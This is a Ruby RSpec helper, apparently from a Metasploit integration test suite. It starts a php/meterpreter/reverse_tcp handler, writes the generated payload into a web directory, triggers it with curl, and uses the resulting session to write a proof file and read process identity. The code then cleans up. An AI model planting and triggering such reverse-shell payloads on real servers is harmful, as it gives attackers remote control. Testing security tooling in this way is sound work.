# frozen_string_literal: true

# Establish the PHP payload/runtime independently before assigning an owner verdict.
module CraftPhpPrerequisite
  def cc_native_php
    callback = @rc.fetch(:callback)
    port = cc_port
    native_workspace = "native_craft_#{Process.pid}_#{port}"
    record = { workspace: native_workspace, port: port, status: 'starting', module_verdict: 'withheld', samples: [] }
    @rc[:php_prerequisite] = record
    expect(rc_json('framework.sessions.keys')).to eq([])
    console_command('workspace -a ' + native_workspace)
    console_command('back')
    console_command('use exploit/multi/handler')
    values = {
      'PAYLOAD' => 'php/meterpreter/reverse_tcp', 'LHOST' => callback.fetch(:host), 'LPORT' => port,
      'ReverseListenerBindAddress' => callback.fetch(:bind), 'ExitOnSession' => false,
      'ListenerTimeout' => 15, 'SessionExpirationTimeout' => 12,
      'SessionCommunicationTimeout' => 5, 'SessionRetryTotal' => 3, 'SessionRetryWait' => 1
    }
    values.each { |key, value| expect(console_command("set #{key} #{value}")).not_to match(/Unknown datastore|Invalid|Error/) }
    expect(console_command('run -j')).not_to include('[-]')
    generated = rc_json("begin;job=framework.jobs.values.find{|j|j.ctx.first.fullname=='exploit/multi/handler'};raise 'Missing native PHP handler' unless job;handler,payload=job.ctx;raise 'Native payload mismatch' unless handler.payload_instance.equal?(payload);{job:job.jid,php:Base64.strict_encode64(handler.payload.encoded),payload:payload.refname,pending:payload.__send__(:pending_connections)};end")
    expect(generated.fetch('payload')).to eq('php/meterpreter/reverse_tcp')
    expect(generated.fetch('pending')).to eq(0)
    path = "/app/web/module-target-craft-native-#{Process.pid}-#{port}.php"
    source_absent = !it_file(path).fetch('exists')
    expect(source_absent).to be(true)
    code = 'import base64,sys;from pathlib import Path;p=Path(sys.argv[1]);assert not p.exists();p.write_bytes(base64.b64decode(sys.argv[2]))'
    rc_command('native-php-write', 'app', 'python3', '-c', code, path, generated.fetch('php'))
    record[:source_sha256] = Digest::SHA256.hexdigest(Base64.strict_decode64(generated.fetch('php')))
    trigger = Thread.new do
      rc_command('native-php-trigger', 'app', 'curl', '--silent', '--show-error', '--max-time', '16', 'http://127.0.0.1:8080/' + File.basename(path), required: false)
    end
    trigger.report_on_exception = false
    metadata = rc_poll(8) do
      # Observe the protected handler counter without replacing registration or dispatch.
      state = rc_json("begin;job=framework.jobs[#{generated.fetch('job').to_s.inspect}];{pending:job ? job.ctx.fetch(1).__send__(:pending_connections) : nil,sessions:framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload,db_id:s.db_record&.id}}};end")
      record.fetch(:samples) << { at: Time.now.utc.iso8601(6), pending: state.fetch('pending') }
      ready = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line).fetch('id') }
      session = state.fetch('sessions').find { |row| row['db_id'] && ready.include?(row.fetch('id')) }
      raise 'Native PHP handler ended before session readiness' if !session && state['pending'].nil?
      raise 'Native PHP prerequisite failed: repeated pending connections before readiness; Craft PHP execution was not attempted' if !session && state.fetch('pending') >= 3

      session
    end
    identifier = metadata.fetch('id')
    record[:metadata] = metadata
    expect(metadata.values_at('owner', 'payload')).to eq(['exploit/multi/handler', 'payload/php/meterpreter/reverse_tcp'])
    proof = "/tmp/module-target-craft-native-php-#{Process.pid}-#{port}"
    proof_absent = !it_file(proof).fetch('exists')
    expect(proof_absent).to be(true)
    channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
    record[:proof] = rc_json("begin;s=framework.sessions.fetch(#{identifier});f=s.fs.file.new(#{proof.inspect},'wb');begin;f.write('native-craft-php');ensure;f.close;end;{pid:s.sys.process.getpid,identity:s.sys.config.getuid};end")
    expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
    record[:native_file] = it_file(proof)
    expect(record.fetch(:native_file)).to eq('exists' => true, 'uid' => it_expected_uid, 'base64' => Base64.strict_encode64('native-craft-php'))
    record[:native_process] = cc_process(record.fetch(:proof).fetch('pid'))
    expect(record.fetch(:native_process)).to include('exists' => true, 'uid' => it_expected_uid)
    record[:native_tcp] = cc_tcp(port)
    expect(record.fetch(:native_tcp)).to include(include('state' => '01', 'uid' => it_expected_uid))
    record[:status] = 'passed'
  rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
    record[:status] = 'failed' if record
    record[:error] = { type: e.class.name, message: e.message } if record
    raise
  ensure
    primary = $ERROR_INFO
    begin
      if identifier
        rc_command('native-php-proof-remove', 'app', 'rm', '-f', proof) if proof_absent
        expect(it_file(proof).fetch('exists')).to be(false) if proof_absent
        expect(rc_json("DruidSessionControl.dispatch(framework,'exit',#{identifier})")).not_to have_key('error')
        rc_json("framework.sessions[#{identifier}]&.kill;true")
        rc_poll { cc_tcp(port).none? { |row| %w[01 08].include?(row.fetch('state')) } }
        record[:closed_report] = rc_poll { JSON.parse(rc_sql("SELECT coalesce(json_agg(r),'[]'::json) FROM (SELECT s.id,s.closed_at,s.stype,s.via_exploit,s.via_payload,w.name AS workspace FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE s.id=#{metadata.fetch('db_id')}) r")).find { |row| row['closed_at'] } }
        expect(record.fetch(:closed_report)).to include('workspace' => native_workspace, 'stype' => 'meterpreter', 'via_exploit' => 'exploit/multi/handler', 'via_payload' => 'payload/php/meterpreter/reverse_tcp')
      end
      console_command('jobs -K')
      console_command('sessions -K')
      expect(trigger.join(20)).not_to be_nil if trigger
      if source_absent
        rc_command('native-php-source-remove', 'app', 'rm', '-f', path)
        expect(it_file(path).fetch('exists')).to be(false)
      end
      console_command('workspace ' + @workspace) if @workspace
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @rc.fetch(:cleanup_errors) << { label: 'native-php-prerequisite', type: e.class.name, message: e.message, primary_error: primary&.message }
      raise unless primary
    ensure
      rc_save
    end
  end
end
